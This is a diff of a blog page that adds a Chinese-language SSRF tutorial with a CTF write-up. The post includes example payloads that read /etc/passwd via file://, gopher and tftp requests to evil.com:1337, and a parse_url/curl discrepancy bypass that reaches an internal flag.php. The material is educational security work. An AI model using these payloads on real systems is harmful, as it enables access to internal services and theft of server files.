@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Hello, hack,CTF,Security">
+    <meta name="keywords" content="SSRF漏洞浅析, hack,CTF,Security">
     <meta name="description" content="Hacking is a new sexy">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Hello | Doublenine&#39;s Blog</title>
+    <title>SSRF漏洞浅析 | Doublenine&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -308,12 +308,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Hello</h1>
+                    <h1 class="description center-align post-title">SSRF漏洞浅析</h1>
                 </div>
             </div>
         </div>
@@ -428,9 +428,21 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                            <a href="/tags/WEB%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">WEB安全</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">
+                                <span class="chip bg-color">漏洞挖掘</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -442,7 +454,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-10-25
+                    2019-10-26
                 </div>
                 
 
@@ -451,14 +463,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    51
+                    1.8k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    7 分
                 </div>
                 
 
@@ -473,12 +485,187 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="Who-am-I"><a href="#Who-am-I" class="headerlink" title="Who am I"></a>Who am I</h2><p><font color = green>你好，我是九九，ID：Doublenine。来自GDUT<br></font></p>
+                <p>[TOC]</p>
+<h1 id="SSRF漏洞学习"><a href="#SSRF漏洞学习" class="headerlink" title="SSRF漏洞学习"></a>SSRF漏洞学习</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul>
+<li>SSRF(Server-Side Request Forgery)，服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到的数据限制。</li>
+</ul>
 <a id="more"></a>
 
-<p>想开始写博客，为了记录一下自己的所学所见，也为了督促自己学习。</p>
+<ul>
+<li>一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，<font color=red>所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人</font>）</li>
+<li>SSRF 形成的原因大都是由于<font color = green>服务端</font>提供了从其他服务器应用获取数据的功能，且没有对目标地址做<font color=green>过滤与限制</font>。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。</li>
+</ul>
+<blockquote>
+<p>比如 ： A网站，是一个所有人都可以访问的外网网站，B网站是一个他们内部的OA网站。<br>所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以同过a网站做<font color=red>中间人</font>，访问b网站，从而达到攻击b网站需求。</p>
+</blockquote>
 <hr>
-<p><strong>希望你能多多支持我！</strong></p>
+<p>通过修改http头让a.com去访问b.com：</p>
+<pre><code>GET /?url=http://b.com/HTTP/1.1
+
+HOST: a.com
+</code></pre><hr>
+<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><ol>
+<li>内外网的端口和服务扫描</li>
+<li>主机本地敏感数据的读取（通过 url scheme (file:///, dict://, ftp://, gopher:// …) 读取内部资源或者让服务执行相应的动作)</li>
+<li>内外网主机应用程序漏洞的利用</li>
+<li>内外网Web站点的漏洞利用</li>
+<li>反射XSS</li>
+</ol>
+<p>……</p>
+<blockquote>
+<p>故此ssrf一般评级为<font color=red>中高危</font>漏洞</p>
+</blockquote>
+<hr>
+<h2 id="漏洞寻找"><a href="#漏洞寻找" class="headerlink" title="漏洞寻找"></a>漏洞寻找</h2><ul>
+<li>正常用户访问网站的流程是：</li>
+</ul>
+<p>输入A网站URL –&gt; 发送请求 –&gt; A服务器接受请求（没有过滤），并处理 –&gt;返回用户响应</p>
+<p>【那网站有个请求是<a href="http://www.baidu.com/xxx.php?image=URL】" target="_blank" rel="noopener">www.baidu.com/xxx.php?image=URL】</a></p>
+<ul>
+<li>那么产生SSRF漏洞的环节在哪里呢？<font color=red>安全的网站应接收请求后，检测请求的合法性</font></li>
+</ul>
+<p>产生的原因：服务器端的验证并没有对其请求获取图片的参数（image=）做出严格的过滤以及限制，导致A网站可以从其他服务器的获取数据</p>
+<p>例如</p>
+<pre><code>www.baidu.com/xxx.php?image=www.abc.com/1.jpg</code></pre><ul>
+<li>如果我们将<a href="http://www.abd.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？" target="_blank" rel="noopener">www.abd.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？</a></li>
+</ul>
+<blockquote>
+<p>如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码</p>
+</blockquote>
+<p>简析: SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后<font color=blue>服务器以他的身份来访问其他服务器的资源。</font></p>
+<hr>
+<h2 id="SSRF产生反射型XSS"><a href="#SSRF产生反射型XSS" class="headerlink" title="SSRF产生反射型XSS"></a><font color=green>SSRF产生反射型XSS</font></h2><p>简单的从外部网站获取一个恶意payload，并且响应类型是html格式，如：</p>
+<pre><code>http://localhost:4567/?url=http://brutelogic.com.br/poc.svg</code></pre><h2 id="利用协议进行信息探测"><a href="#利用协议进行信息探测" class="headerlink" title="利用协议进行信息探测"></a><font color=green>利用协议进行信息探测</font></h2><ul>
+<li>当找到一个 SSRF 时，第一件事情就是测试对应可支持的 url scheme，如：</li>
+</ul>
+<ol>
+<li>file://</li>
+<li>dict://</li>
+<li>sftp://</li>
+<li>ldap://</li>
+<li>tftp://</li>
+<li>gopher://</li>
+</ol>
+<h3 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h3><p>File模式用于从文件系统中获取内容</p>
+<pre><code>http://example.com/ssrf.php?url=file:///etc/passwd
+
+http://example.com/ssrf.php?url=file:///C:/Windows/win.ini</code></pre><h3 id="dic"><a href="#dic" class="headerlink" title="dic://"></a>dic://</h3><p>当服务端禁止或者只允许白名单从外部网站请求资源，你可以通过 dic:// 模式来发送一个请求</p>
+<blockquote>
+<p>dict协议是一个<font color=green>字典服务器协议</font>，通常用于让客户端使用过程中能够访问更多的字典源</p>
+</blockquote>
+<p>DICT URL scheme 通过 DICT 协议引入定义或者可用的单词列表:</p>
+<pre><code>http://example.com/ssrf.php?dict://ad.com:1337/</code></pre><h3 id="sftp"><a href="#sftp" class="headerlink" title="sftp://"></a>sftp://</h3><p>Sftp 是一个 SSH 文件传输协议或安全文件传输协议，和 SSH 打包在一起的单独协议，和 ssh 一样都是通过安全连接进行通信。</p>
+<pre><code>http://example.com/ssrf.php?url=sftp://ad.com:1337/</code></pre><h3 id="tftp"><a href="#tftp" class="headerlink" title="tftp://"></a>tftp://</h3><p>ftfp 用来在客户机与服务器之间进行简单文件传输的协议，提供不复杂、开销不大的文件传输服务。</p>
+<pre><code>http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</code></pre><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher://"></a>gopher://</h3><p>Gopher 是一个分布式文档传输服务，允许用户以无缝的方式针对放在不同位置的文档进行浏览、查询、获取。</p>
+<pre><code>http://example.com/ssrf.php?url=http://ad.com/gopher.php</code></pre><p>gopher.php (host it on ad.com):</p>
+<pre><code>&lt;?php
+  header(&#39;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#39;);
+?&gt;</code></pre><p>PS: <font color=red>在php中要使用gopher协议需要curl的支持</font></p>
+<hr>
+<p>这里我用一道ctf的题目来说，题目如下：</p>
+<pre><code>&lt;?php
+
+function check_inner_ip($url)
+{
+    $match_result=preg_match(&#39;/^(http|https)?:\/\/.*(\/)?.*$/&#39;,$url);
+    if (!$match_result)
+    {
+        die(&#39;url fomat error1&#39;);
+    }
+    try
+    {
+        $url_parse=parse_url($url);
+    }
+    catch(Exception $e)
+    {
+        die(&#39;url fomat error2&#39;);
+    }
+    $hostname=$url_parse[&#39;host&#39;];
+    echo $url_parse[&#39;host&#39;];
+    $ip=gethostbyname($hostname);
+    $int_ip=ip2long($ip);
+    return ip2long(&#39;127.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;10.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;172.16.0.0&#39;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#39;192.168.0.0&#39;)&gt;&gt;16 == $int_ip&gt;&gt;16 || ip2long(&#39;0.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24;
+}
+
+function safe_request_url($url)
+{
+
+    if (check_inner_ip($url))
+    {
+        echo $url.&#39; is inner ip&#39;;
+    }
+    else
+    {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        $output = curl_exec($ch);
+        $result_info = curl_getinfo($ch);
+        if ($result_info[&#39;redirect_url&#39;])
+        {
+            safe_request_url($result_info[&#39;redirect_url&#39;]);
+        }
+        curl_close($ch);
+        var_dump($output);
+    }
+
+}
+
+$url = $_POST[&#39;url&#39;];
+if(!empty($url)){
+    safe_request_url($url);
+}
+else{
+    highlight_file(__file__);
+}
+
+//hint23333:
+//flag in flag.php
+//phpinfo in phpinfo.php
+
+?&gt; </code></pre><p><font color=red>check_inner_ip</font> 通过 <font color=red>url_parse</font> 检测是否为内网 ip 。</p>
+<p>如果满足不是内网 ip ，通过 <font color=red>curl </font>请求 url 返回结果。</p>
+<p>乍一看好像并没有利用点，跳转也做了处理，最终都要经过 check_inner_ip 函数检测。但是忽略了 php_url_parse 和 curl 同时处理 url 不同。</p>
+<p>当处理这个地址</p>
+<pre><code>http://foo@example.com:80@google.com/</code></pre><p><font color=red>curl</font> 和<font color=red> php_url_parse</font> 处理后最终的目标不一样</p>
+<hr>
+<p>分析一下代码逻辑，检测是否内网 ip 通过 parse_url，而最后请求是用 curl 完成的。当遇到上面的 url 格式时，parse_url 判断的是第二个 @ 后接的地址，curl 请求的是第一个。</p>
+<p>于是利用思路就有了，让 parse_url 处理外部网站，最后 curl 请求内网网址。</p>
+<p>构造 payload：</p>
+<pre><code>http://foo@127.0.0.1:80 @www.baidu.com/flag.php</code></pre><p>可查询到本地的文件flag.php</p>
+<blockquote>
+<p>这个空格是为了绕过curl团队给出的一个补丁</p>
+</blockquote>
+<h2 id="漏洞常见位置"><a href="#漏洞常见位置" class="headerlink" title="漏洞常见位置"></a>漏洞常见位置</h2><ul>
+<li>我觉得所有调外部资源的参数都有可能存在ssrf漏洞</li>
+</ul>
+<p>1）分享：通过URL地址分享网页内容</p>
+<p>2）转码服务</p>
+<p>3）在线翻译</p>
+<p>4）图片加载与下载：通过URL地址加载或下载图片</p>
+<p>5）图片、文章收藏功能</p>
+<p>6）未公开的api实现以及其他调用URL的功能</p>
+<p>7）从URL关键字中寻找：</p>
+<pre><code>share
+wap
+url
+link
+src
+source
+target
+u
+3g
+display
+sourceURl
+imageURL
+domain
+...</code></pre><h2 id="验证方法"><a href="#验证方法" class="headerlink" title="验证方法"></a>验证方法</h2><ul>
+<li><p>因为SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在SSRF漏洞</p>
+</li>
+<li><p>在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞</a></p>
+</li>
+</ul>
 
             </div>
             <hr/>
@@ -504,7 +691,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://gostycw.github.io/2019/10/25/Hello/">https://gostycw.github.io/2019/10/25/Hello/</a>
+                    <a href="https://gostycw.github.io/2019/10/26/SSRF%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/">https://gostycw.github.io/2019/10/26/SSRF%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -541,7 +728,19 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                                <a href="/tags/WEB%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">WEB安全</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">
+                                    <span class="chip bg-color">漏洞挖掘</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -711,26 +910,25 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/10/26/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(1)/">
+                <a href="/2019/10/26/GUETCTF_web3_wp/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="C语言学习笔记">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="GUETCTF-WEB3-writeup">
                         
-                        <span class="card-title">C语言学习笔记</span>
+                        <span class="card-title">GUETCTF-WEB3-writeup</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            C语言学习笔记
-[TOC]
-数据类型1.基本类型
-整数型：int、short int、long int、long long int
-short int ≤ int ≤ long int≤ long long int
+                            [TOC]
+GUETCTF-web3-wp打开网页是一个登陆界面，f12查看源码：
 
 
-浮点型：float、
+&lt;!--  
+$user = $_GET[&quot;username&quot;];  
+$file = $_GET[&quot;file&qu
                         
                     </div>
                     <div class="publish-info">
@@ -748,8 +946,8 @@ short int ≤ int ≤ long int≤ long long int
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%BC%96%E7%A8%8B/">
-                        <span class="chip bg-color">编程</span>
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                 </div>
@@ -760,33 +958,37 @@ short int ≤ int ≤ long int≤ long long int
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/10/25/Hello/">
+                <a href="/2019/10/26/PWN%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="Hello">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="PWN笔记（一）">
                         
-                        <span class="card-title">Hello</span>
+                        <span class="card-title">PWN笔记（一）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Who am I你好，我是九九，ID：Doublenine。来自GDUT
+                            [TOC]
+缓冲区溢出一、缓存区溢出条件：
+1.程序有向栈写入数据的行为
+2.程序不限制写入数据的长度；
 
 
-想开始写博客，为了记录一下自己的所学所见，也为了督促自己学习。
 
-希望你能多多支持我！
+二、函数调用栈
+1.调用函数在栈内，被调用函数在栈顶。调用结束后被调用函数被弹出，栈顶恢复到调用函数的状态
 
+2.esp –&g
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-10-25
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-10-26
                             </span>
                         <span class="publish-author">
                             
@@ -796,7 +998,18 @@ short int ≤ int ≤ long int≤ long long int
                         </span>
                     </div>
                 </div>
-
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">二进制安全</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
